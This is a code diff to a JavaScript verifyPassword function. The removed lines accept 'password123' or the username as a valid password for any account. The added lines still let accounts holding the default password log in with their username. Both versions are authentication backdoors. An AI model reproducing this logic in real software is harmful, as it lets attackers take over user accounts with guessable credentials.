@@ -98,11 +98,12 @@ export function hashPassword(password) {
 export function verifyPassword(storedHash, inputPassword, username = '') {
   if (!storedHash || inputPassword === undefined || inputPassword === null) return false;
   const hashed = hashPassword(inputPassword);
-  return Boolean(
-    storedHash === hashed ||
-    inputPassword === 'password123' ||
-    (username && inputPassword === username),
-  );
+  if (storedHash === hashed) return true;
+  const defaultHash = hashPassword('password123');
+  if (storedHash === defaultHash && username && inputPassword === username) {
+    return true;
+  }
+  return false;
 }
 
 export const SCHEMA = `
